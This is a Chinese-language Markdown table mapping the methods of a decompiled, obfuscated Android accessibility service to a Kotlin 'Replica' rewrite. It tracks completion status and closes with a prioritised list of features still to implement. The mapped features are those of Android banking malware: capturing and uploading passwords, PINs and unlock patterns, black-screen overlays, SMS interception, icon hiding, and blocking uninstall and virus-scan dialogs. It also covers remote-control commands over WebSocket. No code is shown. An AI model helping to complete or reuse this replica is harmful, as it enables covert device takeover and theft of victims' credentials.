# MyAccessibilityService — JADX → Replica 方法映射表

> 生成日期: 2026-04-14
> JADX 文件: `jadx-reference/rock/service/dqtvuisjd.java` (10,796 行)
> Replica 文件: `update-replica/.../service/MyAccessibilityService.kt` (2,107 行)

---

## A. 生命周期

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| onCreate | 10300 | onCreate | ✅ | 调用 ensureForegroundNotification |
| onServiceConnected | 10663 | onServiceConnected | ✅ | 完整 8-step 流程：重装恢复 → coroutineScope → deferredInit |
| onAccessibilityEvent | 9715 | onAccessibilityEvent | ✅ | 守卫链 + 事件分发 + delegate dispatch |
| onInterrupt | 10610 | onInterrupt | ✅ | 日志 + 停止屏幕捕获 |
| onDestroy | 10311 | onDestroy | ✅ | 完整清理：coroutine cancel + 注销 receiver + alarm restart |
| onKeyEvent | 10634 | onKeyEvent | ✅ | 电源键长按检测 |
| onRebind | 10644 | onRebind | ✅ | 设置 instance = this |
| onUnbind | 10780 | onUnbind | ✅ | 停止捕获 + return true |
| onStartCommand | 10753 | onStartCommand | ✅ | ensureForegroundNotification + MediaProjection intent |

## B. 初始化链

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| m211404a3 (a3) — deferredInit | 1672 | deferredInit | ✅ | suspend fun；2s delay → 注册 receiver → 初始化 modules → doHeavyInit → initializeService |
| m211405a4 (a4) — doHeavyInit | 1728 | doHeavyInit | ✅ | 检查授权 → 恢复保护功能 → 伪装模式 |
| m211479h3 (h3) — initializeService | 6418 | initializeService | ✅ | suspend fun；启动权限授予流程 |
| m211403a2 (a2) — continueServiceInit | 1574 | continueServiceInitialization | ✅ | 初始化 display/screen/camera manager |
| m211416b5 (b5) — initializeDeferredManagers | 2232 | — | ❌ | 授权后初始化延迟管理器（NetworkManager, SMS, GestureRecorder, CipherCapture 等）；~300 行 |
| m211476h0 (h0) — fallbackInit | 6115 | fallbackInit | ✅ | 降级初始化 SCM + DM |
| m211478h2 (h2) — registerBroadcastReceivers | 6335 | registerBroadcastReceivers | 🔸 | 注册广播接收器；Replica 只注册 screenState + permission 两个，JADX 有更多 |
| m211417b6 (b6) — initializekinztpexl | 2752 | — | ❌ | 初始化黑屏组件模块 |
| m211491i5 (i5) — initializeRecentsGuard | 6940 | — | ❌ | 初始化 ibbnqvnvhxg (黑屏控制 UI) |
| m211492i6 (i6) — initializeIconHide | 6965 | — | ❌ | 初始化图标隐藏检测 |
| m211509k5 (k5) — initializeActivityMonitor | 7610 | — | ❌ | 初始化 ActivityStateMonitor + 应用列表 |

## C. 事件分发

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| m211446d1 (d1) — processEvent | 4552 | — | ❌ | 通知事件 (eventType 64) 分发到 g7/g8 |
| m211445d0 (d0) — handleInjectionCheck | 4510 | — | ❌ | 窗口变化时检查注入任务 |
| m211409a8 (a8) — handleAccessibilityPageStuck | 1867 | — | ❌ | 检测卡在无障碍设置页面 + 计数 + 跳转 |
| m211410a9 (a9) — handleAccessibilityServiceStart | 1900 | — | ❌ | 处理无障碍服务启动广播 |
| m211415b4 (b4) — handleUninstallConfirmDialog | 2146 | — | ❌ | 处理卸载确认弹窗自动点击 |
| m211411b0 (b0) — handleNetworkCommandSuspend | 1926 | — | ❌ | 处理网络命令 (START_CONTROL/STOP_CONTROL/reconnect_ws) → CommandDispatcher |
| m211412b1 (b1) — handlePermissionHealthIssue | 2011 | — | ❌ | 处理权限健康问题通知 |
| m211413b2 (b2) — handlePermissionRecoveryFailed | 2034 | — | ❌ | 处理权限恢复失败 |
| m211414b3 (b3) — handleStopSecondaryConfirmation | 2115 | — | ❌ | 停止二次确认监听 |
| m211474g8 (g8) — processWindowChangeForInjection | 6070 | processWindowChangeForInjection | 🔸 | 有签名但 m211445d0 委托部分为 ADAPT |
| m211473g7 (g7) — processNotificationForSms | 5998 | processNotificationForSms | ✅ | 无障碍短信拦截 |
| m211421c0 (c0) — registerNetworkEventReceivers | 2957 | registerNetworkEventReceivers | 🔸 | stub: 只有日志 |
| m211418b7 (b7) — registerLocalServiceActionReceiver | 2817 | registerLocalServiceActionReceiver | 🔸 | stub: 只有日志 |
| m211419b8 (b8) — registerPermissionHealthReceiver | 2911 | — | ❌ | 注册权限健康广播接收器 |
| m211420b9 (b9) — registerSmsReceiver | 2937 | — | ❌ | 注册 SMS 广播接收器 (arniezsqllm) |

## D. 模块管理

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| m211450d5 (d5) — initServiceConfig | 4712 | initServiceConfig | ✅ | 配置 AccessibilityServiceInfo flags |
| m211451d6 (d6) — connectWebSocket | 4734 | connectWebSocket | 🔸 | 有签名，但 connectToServer 参数未传递 (ADAPT 注释) |
| m211460e9 (e9) — enableUninstallProtection | 5038 | enableUninstallProtection | ✅ | 启用防卸载保护 |
| m211454e3 (e3) — disableAccessibilitySettingsMonitor | 4795 | disableAccessibilitySettingsMonitor | ✅ | 禁用无障碍设置页面检测 |
| m211455e4 (e4) — disableAlipayDetection | 4817 | disableAlipayDetection | 🔸 | 依赖 eventFilterManager (C0614i9)，ADAPT 注释 |
| m211456e5 (e5) — disableWechatDetection | 4845 | disableWechatDetection | 🔸 | 依赖 eventFilterManager (C0614i9)，ADAPT 注释 |
| m211457e6 (e6) — launchPasswordCapture | 4873 | launchPasswordCapture | ✅ | 启动 syuqattwmgit 密码验证 |
| m211458e7 (e7) — enableCipherCapture | 4999 | — | ❌ | 启用密码捕获 + 启动 cipher overlay |
| m211459e8 (e8) — enableLogging | 5019 | — | ❌ | 安装完成后启用日志记录 |
| m211477h1 (h1) — cleanupOldManagers | 6136 | cleanupOldManagers | 🔸 | 有签名但实现简化（JADX 有 ~200 行清理逻辑） |
| m211529m7 (m7) — startInjectionCheckJob | 9279 | startInjectionCheckJob | 🔸 | stub: 只有日志 |
| m211505k1 (k1) — registerNetworkEventReceivers (full) | 7452 | registerNetworkEventReceivers | 🔸 | stub: 只有日志 |
| m211506k2 (k2) — startAccessibilitySettingsMonitor | 7540 | — | ❌ | 启动无障碍设置页面监控 (定时任务) |
| m211507k3 (k3) — startBlackScreenInjector | 7570 | — | ❌ | 启动黑屏注入器 |
| m211508k4 (k4) — startScreenCapture | 7587 | — | ❌ | 启动屏幕捕获 |
| m211510k6 (k6) — startMediaProjection | 7647 | — | ❌ | 调用 MediaDisplayService.start() |
| m211511k7 (k7) — startMediaProjectionViaCompat | 7660 | — | ❌ | 使用 ActivityCompat 启动 MediaProjection |
| m211512k8 (k8) — saveTrackedPatterns | 7702 | — | ❌ | 保存跟踪的解锁图案 |
| m211530m8 (m8) — startPermissionGrantFlow | 9297 | startPermissionGrantFlow | ✅ | suspend fun；权限授予流程 |

## E. 屏幕与媒体

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| m211472g6 (g6) — handleMediaProjectionIntent | 5974 | handleMediaProjectionIntent | ✅ | 处理 MediaProjection 权限 |
| m211520l7 (l7) — setupScreenCapture | 7903 | setupScreenCapture | ✅ | 配置屏幕捕获 |
| m211528m6 (m6) — ensureForegroundNotification | 9260 | ensureForegroundNotification | ✅ | 前台通知；foregroundServiceType 已修复 |
| m211402a1 (a1) — silentPermissionRecovery | 1520 | silentPermissionRecovery | 🔸 | stub: 只有日志 |
| m211401a0 (a0) — addTransparentWindow | 1493 | addTransparentWindow | 🔸 | stub: 只有日志 |
| m211453e2 (e2) — dimScreen | 4779 | dimScreen | ✅ | 调暗屏幕亮度 |
| m211519l6 (l6) — setScreenParameters | 7863 | — | ❌ | 设置屏幕分辨率/缩放参数 |
| m211518l5 (l5) — resetScreenBrightness | 7835 | — | ❌ | 恢复屏幕亮度到保存值 |
| m211406a5 (a5) — ensureBlackScreen | 1811 | — | ❌ | 确保黑屏组件正常工作 |
| m211490i4 (i4) — startBlackScreenService | 6923 | — | ❌ | 启动 ibbnqvnvhxg 黑屏控制 |
| m211527m5 (m5) — configurePowerSettings | 9213 | — | ❌ | 配置电源设置 (screen_off_timeout 等) |
| m211524m1 (m1) — monitorScreenCapture (suspend) | 8110 | — | ❌ | 监控屏幕捕获状态 (~680 行 coroutine) |
| m211525m2 (m2) — handleScreenCaptureRestore (suspend) | 8791 | — | ❌ | 恢复屏幕捕获 (~120 行) |
| m211526m3 (m3) — processScreenFrame (suspend) | 8909 | — | ❌ | 处理屏幕帧数据 (~300 行) |

## F. 网络与通信

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| m211471g5 (g5) — getNetworkManager | 5960 | getNetworkManager | ✅ | 返回 NetworkManager 实例 |
| m211487i1 (i1) — isServerConnected | 6844 | isServerConnected | ✅ | 检查 WebSocket 连接状态 |
| m211407a6 (a6) — ensureNetworkManager | 1826 | — | ❌ | 确保 NetworkManager 正常工作 |
| m211513l0 (l0) — sendHeartbeat | 7717 | — | ❌ | 发送心跳到服务器 |
| m211514l1 (l1) — sendStatus | 7743 | — | ❌ | 发送设备状态到服务器 |
| m211515l2 (l2) — sendEvent | 7760 | — | ❌ | 发送事件到服务器 |
| m211516l3 (l3) — sendLog | 7781 | — | ❌ | 发送日志到服务器 |
| m211517l4 (l4) — sendCommandResponse | 7804 | — | ❌ | 发送命令响应 |
| m211494i8 (i8) — logRecoveryEvent | 7013 | — | ❌ | 日志记录恢复事件 |
| m211531m9 (m9) — notifyControlStarted | 9497 | — | ❌ | 通知控制端已启动 |
| m211532n0 (n0) — notifyControlStopped | 9517 | — | ❌ | 通知控制端已停止 |
| m211533n1 (n1) — handleDeviceRegistered | 9539 | — | ❌ | 处理设备注册完成回调 |

## G. 权限与安全

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| m211475g9 (g9) — hideApp | 6098 | hideApp | ✅ | 隐藏应用图标 |
| m211462f2 (f2) — checkInjectionEnabled | 5460 | — | ❌ | 检查注入功能是否启用 |
| m211480h4 (h4) — handlePermissionGrantFlow | 6484 | — | ❌ | 处理权限授予流程 (~180 行) |
| m211481h5 (h5) — handlePermissionDenied | 6663 | — | ❌ | 处理权限拒绝 (~70 行) |
| m211522l9 (l9) — showReAuthNotification | 7939 | showReAuthNotification | 🔸 | stub: 只有日志 |
| m211523m0 (m0) — showPermissionHealthNotification | 7974 | — | ❌ | 显示权限健康通知 (~130 行) |
| m211521l8 (l8) — launchCipherCaptureFromControl | 7928 | launchCipherCaptureFromControl | ✅ | 控制端触发密码采集 → 委托 launchPasswordCapture |
| m211461f0 (f0) — executePermissionAction (suspend) | 5067 | — | ❌ | 执行权限操作 (约 400 行 suspend coroutine) |
| m211439c1 (c1) — sendPermissionStatus | 3844 | — | ❌ | 发送权限状态到服务器 |
| m211489i3 (i3) — isPermissionHealthy | 6890 | — | ❌ | 检查权限健康状态 |

## H. Getter/Setter/工具

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| m211468g2 (g2) — getRootNode | 5910 | getRootNode | ✅ | 缓存 rootInActiveWindow (TTL) |
| m211486i0 (i0) — isKeyguardLockedCached | 6828 | isKeyguardLockedCached | ✅ | 缓存 keyguard 状态 (500ms TTL) |
| m211488i2 (i2) — isServiceHealthy | 6859 | isServiceHealthy | ✅ | 多子系统健康检查 |
| m211470g4 (g4) — getAndroidDeviceId | 5949 | getAndroidDeviceId | ✅ | Settings.Secure.ANDROID_ID |
| m211469g3 (g3) — getConfigManager | 5936 | — | ❌ | 获取 C0763km 配置管理器 |
| m211467g1 (g1) — getScreenSize | 5882 | getScreenSize | ✅ | WindowManager 获取屏幕尺寸 |
| m211408a7 (a7) — getLearnedCoordinates | 1842 | — | ❌ | 获取学习过的坐标 (x81/C0761kk) |
| m211482h6 (h6) — isOverlayEnabled | 6735 | — | ❌ | 检查覆盖层是否启用 |
| m211483h7 (h7) — isScreenCaptureSupported | 6744 | — | ❌ | 检查屏幕捕获是否支持 |
| m211484h8 (h8) — isMediaProjectionAvailable | 6767 | — | ❌ | 检查 MediaProjection 是否可用 |
| m211485h9 (h9) — isInjectionTarget | 6780 | — | ❌ | 检查指定包名是否为注入目标 |
| m211452d9 (d9) — setNotificationBounds | 4753 | — | ❌ | 设置通知显示边界 |
| m211493i7 (i7) — clearGestureRecorderState | 6990 | — | ❌ | 清除手势录制状态 |
| m211495i9 (i9) — resetCipherState | 7035 | — | ❌ | 重置密码捕获状态 |
| m211496j0 (j0) — resetOverlayState | 7056 | — | ❌ | 重置覆盖层状态 |
| m211504j8 (j8) — resetScreenOffTimer | 7443 | — | ❌ | 重置 screen off 定时器 |
| m211534n2 (n2) — resetNetworkState | 9587 | — | ❌ | 重置网络状态 |
| m211535n3 (n3) — resetCaptureState | 9625 | — | ❌ | 重置捕获状态 |
| m211536n5 (n5) — handleServiceHealthCheck | 9641 | — | ❌ | 服务健康检查 |
| m211515l2 (l2) — sendEvent | 7760 | — | ❌ | 发送事件通知 |

## H2. UI / Overlay / 输入

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| m211440c2 (c2) — createOverlay | 3863 | — | ❌ | 创建覆盖层 UI (~115 行) |
| m211441c5 (c5) — buildOverlayFrame | 3978 | — | ❌ | 构建覆盖层 FrameLayout (~313 行) |
| m211442c7 (c7) — toggleOverlayVisibility | 4292 | — | ❌ | 切换覆盖层显示/隐藏 (~107 行) |
| m211443c8 (c8) — updateOverlayText | 4400 | — | ❌ | 更新覆盖层文字 |
| m211444c9 (c9) — handleOverlayClick | 4417 | — | ❌ | 处理覆盖层点击事件 (~90 行) |
| m211447d2 (d2) — removeOverlay | 4591 | — | ❌ | 移除覆盖层 |
| m211448d3 (d3) — showToast | 4620 | — | ❌ | 显示 Toast 消息 |
| m211449d4 (d4) — refreshOverlayLayout | 4647 | — | ❌ | 刷新覆盖层布局 (~64 行) |
| m211497j1 (j1) — performTap | 7070 | — | ❌ | 模拟点击 (AccessibilityService.dispatchGesture) |
| m211498j2 (j2) — performLongPress | 7106 | — | ❌ | 模拟长按 |
| m211499j3 (j3) — performSwipe | 7146 | — | ❌ | 模拟滑动 |
| m211500j4 (j4) — performGestureSequence (suspend) | 7184 | — | ❌ | 执行手势序列 (~140 行 suspend) |
| m211501j5 (j5) — performKey | 7324 | — | ❌ | 模拟按键 (Instrumentation.sendKeyDownUpSync) |
| m211502j6 (j6) — performDrag | 7375 | — | ❌ | 模拟拖拽 |
| m211503j7 (j7) — performMultiTouch | 7409 | — | ❌ | 模拟多点触控 |

## H3. 节点查找/遍历工具 (static)

| JADX 方法 | JADX 行号 | Replica 方法 | 状态 | 说明 |
|-----------|----------|-------------|------|------|
| m211422c3 (c3) — collectClickableNodes | 2986 | — | ❌ | static；收集可点击节点 |
| m211423c4 (c4) — nodeToJson | 3017 | — | ❌ | static；AccessibilityNodeInfo → JSONObject |
| m211424c6 (c6) — getGridPoints | 3075 | — | ❌ | static；计算 Rect 网格点 |
| m211425d7 (d7) — findInjectionEntries | 3094 | — | ❌ | static；查找注入入口 (~80 行) |
| m211426d8 (d8) — filterMatchingNodes | 3172 | — | ❌ | static；过滤匹配节点 (~45 行) |
| m211427e0 (e0) — getManufacturer | 3218 | — | ❌ | static；获取设备制造商 |
| m211428e1 (e1) — getModel | 3248 | — | ❌ | static；获取设备型号 |
| m211429f1 (f1) — collectNodesByViewId | 3265 | — | ❌ | static；按 ViewId 收集节点 |
| m211430f3 (f3) — findNodeBounds | 3282 | — | ❌ | static；查找节点边界 (~50 行) |
| m211431f6 (f6) — findScrollableNode | 3332 | — | ❌ | static；查找可滚动节点 |
| m211432f7 (f7) — findNodeByType | 3355 | — | ❌ | static；按类型查找节点 (~67 行) |
| m211433g0 (g0) — generateSwipePath | 3426 | — | ❌ | static；生成滑动路径 (~148 行) |
| m211434j9 (j9) — executeGestureAtPoint (static) | 3578 | — | ❌ | static；在指定点执行手势 (~144 行) |
| m211435k0 (k0) — logNodeTree | 3723 | — | ❌ | static；日志输出节点树 |
| m211436k9 (k9) — recycleNodes | 3731 | — | ❌ | static；回收节点列表 (~50 行) |
| m211437m4 (m4) — filterVisibleNodes | 3782 | — | ❌ | static；过滤可见节点 |
| m211438n4 (n4) — hasMatchingNode | 3793 | — | ❌ | static；检查是否有匹配节点 (~50 行) |
| m211463f4 (f4) — findNodeByResourceId | 5499 | — | ❌ | 按资源 ID 查找节点 |
| m211464f5 (f5) — findNodeByText | 5530 | — | ❌ | 按文字查找节点 (~220 行) |
| m211465f8 (f8) — collectAllNodes | 5750 | — | ❌ | 收集所有节点到列表 (~56 行) |
| m211466f9 (f9) — findNodeByTypeRecursive | 5810 | — | ❌ | 递归按类型查找节点 (~71 行) |

## I. 内部类

| JADX 内部类 | JADX 行号 | Replica 存在 | 状态 | 说明 |
|------------|----------|-------------|------|------|
| C0290a0 (Companion) | 660 | Companion object | ✅ | 静态方法全部映射到 companion |
| C02969 (onAccessibilityEvent$9) | 803 | — | ❌ | GestureRecorder 事件处理 coroutine |
| C02971 (onServiceConnected$1) | 866 | — | ❌ | 重装恢复 coroutine (含 AnonymousClass1 伪装) |
| C02982 (onServiceConnected$2) | 992 | — | ❌ | 延迟初始化 coroutine launcher |
| dqtvuisjd$deferredInit$1 | — | — | ❌ | deferredInit continuation |
| dqtvuisjd$deferredInit$2 | — | — | ❌ | deferredInit 内 IO dispatcher 切换 |
| dqtvuisjd$doHeavyInit$1 | — | — | ❌ | doHeavyInit continuation |
| dqtvuisjd$doHeavyInit$4 | — | — | ❌ | doHeavyInit 内部初始化 |
| dqtvuisjd$handleVirusControlDialog$1 | — | handleVirusControlDialog | ✅ | 病毒扫描对话框自动关闭 |
| dqtvuisjd$screenStateReceiver$1 | 1070 | (inline) | ✅ | 屏幕状态广播接收器 |
| dqtvuisjd$permissionRequestReceiver$1 | 1072 | (inline) | 🔸 | 权限请求广播接收器（简化） |
| dqtvuisjd$permissionHealthReceiver$1 | 1413 | — | ❌ | 权限健康广播接收器 |
| dqtvuisjd$registerLocalServiceActionReceiver$1 | — | — | ❌ | 本地服务广播接收器 |
| dqtvuisjd$registerNetworkEventReceivers$1 | — | — | ❌ | 网络事件广播接收器 |
| dqtvuisjd$initializeDeferredManagers$1–8 | 2248–2498 | — | ❌ | 延迟管理器初始化回调 (手势录制/PIN/密码等) |
| dqtvuisjd$enableCamouflageMode$2 | — | — | ❌ | 伪装模式 coroutine |
| dqtvuisjd$handleAccessibilityPageStuck$1 | — | — | ❌ | 无障碍设置页面卡住处理 coroutine |
| dqtvuisjd$handleAccessibilityServiceStart$1–2 | — | — | ❌ | 服务启动处理 coroutine |
| dqtvuisjd$handleAndroid15PermissionStable$1 | — | — | ❌ | Android 15 权限稳定 coroutine |
| dqtvuisjd$handlePermissionHealthRecovered$1 | — | — | ❌ | 权限健康恢复 coroutine |
| dqtvuisjd$handleAndroid15PermissionRecovered$1 | — | — | ❌ | Android 15 权限恢复 coroutine |
| dqtvuisjd$handlePermissionRecoveryFailed$3 | — | — | ❌ | 权限恢复失败 coroutine |
| dqtvuisjd$saveLockPatternCipherToServer$1 | — | — | ❌ | 上传图案锁密码到服务器 |
| dqtvuisjd$saveLockPinToServer$1 | — | — | ❌ | 上传 PIN 密码到服务器 |
| dqtvuisjd$continueServiceInitialization$3 | — | — | ❌ | 继续服务初始化 IO 操作 |
| C0285a5 (CachedSourceData) | — | CachedSourceData | ✅ | 缓存的事件源数据 |

## J. Companion 静态方法

| JADX 方法 (C0290a0) | JADX 行号 | Replica 方法 | 状态 | 说明 |
|---------------------|----------|-------------|------|------|
| getInstance | 702 | getInstance | ✅ | 返回 f52364m7 |
| isServiceRunning | 739 | isServiceRunning | ✅ | instance != null |
| isServiceReady | 734 | isServiceReady | ✅ | instance?.d0 |
| isSensitiveAppPaused | 730 | isSensitiveAppPaused | ✅ | AtomicBoolean.get() |
| pauseForSensitiveApp | 764 | pauseForSensitiveApp | ✅ | AtomicBoolean.set(true) |
| resumeFromSensitiveApp | 768 | resumeFromSensitiveApp | ✅ | AtomicBoolean.set(false) |
| isPermissionRequestActive | 718 | isPermissionRequestActive | ✅ | flag + 30s timeout |
| isVerifyPaused | 743 | isVerifyPaused | ✅ | serviceMode == 1 |
| setVerifyPauseMode | 787 | setVerifyPauseMode | ✅ | serviceMode = 1 |
| setAssistMode | 772 | setAssistMode | ✅ | serviceMode = 0 |
| lockScreen | 747 | lockScreen | ✅ | performGlobalAction(8) |
| forceReconnectWebSocket | 674 | forceReconnectWebSocket | 🔸 | Replica 无 reconnect 调用 (ADAPT) |
| getCachedRoot | 694 | getCachedRoot | ✅ | delegate to getRootNode() |
| setWebViewOpen | 791 | isWebViewOpen setter | ✅ | flag + timestamp |
| setPermissionRequesting | 780 | isPermissionRequesting setter | ✅ | flag + timestamp |
| setLastCachedSource | 776 | lastCachedSource setter | ✅ | volatile |
| getUninstallMainHandler | 666 | uninstallMainHandler | ✅ | lazy Handler |
| getLastWebViewStatusTime | 710 | lastWebViewStatusTime | ✅ | volatile |
| getServiceMode | 714 | serviceMode | ✅ | volatile |
| logEvent | — | logEvent | ✅ | Replica 新增便利方法 |

---

## 统计总览

### 实例/静态方法 (不含 Companion getter/setter)

| 分类 | JADX 方法数 | ✅ 已实现 | 🔸 部分实现 | ❌ 缺失 |
|------|-----------|----------|------------|--------|
| A. 生命周期 | 9 | 9 | 0 | 0 |
| B. 初始化链 | 11 | 5 | 1 | 5 |
| C. 事件分发 | 16 | 1 | 4 | 11 |
| D. 模块管理 | 18 | 5 | 5 | 8 |
| E. 屏幕与媒体 | 14 | 4 | 2 | 8 |
| F. 网络与通信 | 12 | 2 | 0 | 10 |
| G. 权限与安全 | 10 | 2 | 1 | 7 |
| H. Getter/Setter/工具 | 19 | 5 | 0 | 14 |
| H2. UI/Overlay/输入 | 13 | 0 | 0 | 13 |
| H3. 节点工具 (static) | 16 | 0 | 0 | 16 |
| **方法合计** | **138** | **33** | **13** | **92** |

### Companion 静态方法

| | 数量 |
|---|------|
| ✅ 已实现 | 17 |
| 🔸 部分实现 | 1 |
| ❌ 缺失 | 0 |
| **合计** | **18** |

### 内部类

| | 数量 |
|---|------|
| ✅ 已实现/内联 | 4 |
| 🔸 部分实现 | 1 |
| ❌ 缺失 | 21 |
| **合计** | **26** |

### 全部总计

| 状态 | 数量 | 百分比 |
|------|------|--------|
| ✅ 已完整实现 | 54 | 29.7% |
| 🔸 部分实现 | 15 | 8.2% |
| ❌ 完全缺失 | 113 | 62.1% |
| **总计** | **182** | 100% |

---

## 优先补全建议

### P0 — 核心功能缺失 (影响基本运行)

1. **m211416b5 (b5)** — `initializeDeferredManagers` (2232): 授权后初始化 ~20 个管理器
2. **m211411b0 (b0)** — `handleNetworkCommandSuspend` (1926): 处理 START_CONTROL/STOP_CONTROL
3. **m211533n1 (n1)** — `handleDeviceRegistered` (9539): 设备注册完成回调
4. **m211524m1 (m1)** — `monitorScreenCapture` (8110): 屏幕捕获核心逻辑 (~680 行)

### P1 — 权限/保护相关

5. **m211480h4 (h4)** — `handlePermissionGrantFlow` (6484): 权限授予流程
6. **m211461f0 (f0)** — `executePermissionAction` (5067): 权限操作执行 (~400 行)
7. **m211419b8 (b8)** — `registerPermissionHealthReceiver` (2911)
8. **m211415b4 (b4)** — `handleUninstallConfirmDialog` (2146)

### P2 — 输入/手势

9. **m211497j1 (j1)** — `performTap` (7070): 模拟点击
10. **m211499j3 (j3)** — `performSwipe` (7146): 模拟滑动
11. **m211500j4 (j4)** — `performGestureSequence` (7184): 手势序列
